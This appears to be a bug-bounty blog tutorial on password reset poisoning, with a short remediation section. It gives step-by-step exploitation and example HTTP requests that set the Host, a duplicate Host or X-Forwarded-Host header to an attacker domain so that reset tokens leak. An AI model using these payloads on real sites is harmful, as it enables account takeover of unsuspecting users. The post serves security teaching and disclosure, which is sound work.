---
# Post Settings
title: "Exploiting Password Reset Poisoning"
date: "2021-11-13"

tags: ["webapp", "bugbounty"]
categories: ["blog"]
draft: false
toc: false

# Override default meta tags
noindex: false
author: false
description: ""
---

To date, one of my most lucrative bug bounties came from a password reset poisoning vulnerability. This post walks through the process of finding, exploiting, and fixing this bug to help you earn a max payout in your own disclosures!


# Overview

Password reset poisoning is a header based attack, where an attacker can manipulate the URL of a password reset link. Through adding or modifying HTTP request header values during an application’s password reset process, it may be possible to overwrite the domain of the link sent to the user:
```text
Hi,
Click the link below to reset your password:
https://<attacker-domain>/reset?token=123456789
```

Once clicked, the reset token is relayed to an attacker-controlled domain — resulting in account takeover.

![](/images/posts/password-reset-poisoning/1.png)


# Exploitation

1. Navigate to the web application’s “Password Reset” page.

2. Enter the name, username, or email of the target user’s account.

3. Use a web application proxy (BurpSuite, OWASP-ZAP, etc) to intercept the request and modify the Host: header value to an attacker controlled address:
    * *Don’t have your own server? Burp Collaborator links can help!*
```
POST /login/password-reset HTTP/1.1
Host: <attacker-domain>
...
{"email":"target-user@company.com"}
```

4. The user will receive a legitimate password reset email from the site. However, the link containing the secret reset token will show our modified header value:
```
https://<attacker-domain>/reset?token=123456789
```

5. Once clicked by the user, the attacker can intercept the token and replay it’s value on the target application to successfully reset the victims password for full account takeover!

![](/images/posts/password-reset-poisoning/2.png)
*Workflow created by [PortSwigger](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning)*


# Advanced Exploitation
*Host header not working? Try these techniques*

## Double Host Header

Depending on how the server reacts to duplicate Host headers in the HTTP request, the malicious input may take precedence over the default:
```
POST /login/password-reset HTTP/1.1
Host: example.com
Host: <attacker-domain>
...
```

## Test Override Headers
Override headers such as `X-Forwarded-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`, and `X-Host` can sometimes work to replace the Host header value— resulting in successful exploitation:
```
POST /login/password-reset HTTP/1.1
Host: example.com
X-Forwarded-Host: <attacker-domain>
...
```


# Remediation

## Why does this happen?
Password reset poisoning can occur when a website relies on header values to direct traffic or craft page links. If left unchecked, an attacker can inject their own values and modify the intended behavior of the application.

## How to fix it?

The easiest approach, is avoid using header values to define site navigation. Request headers are not protected fields and can be modified by the user to inject malicious inputs. Additionally, performing `Host` header validation and removing support for override headers such as `X-Forwarded-Host` can be good mitigating strategies.

For more prevention methods, checkout the [Preventing HTTP Host header attacks](https://portswigger.net/web-security/host-header) section of [this](https://portswigger.net/web-security/host-header) article.


# Practice Resources

Want to try this technique on your own? Checkout:
* PortSwigger Lab: [Basic Password Reset Poisoning](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-basic-password-reset-poisoning).
* PortSwigger Lab: [Password Reset Poisoning via Middleware](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware).
* PortSwigger Lab: [Password Reset Poisoning via Dangling Markup](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-password-reset-poisoning-via-dangling-markup).

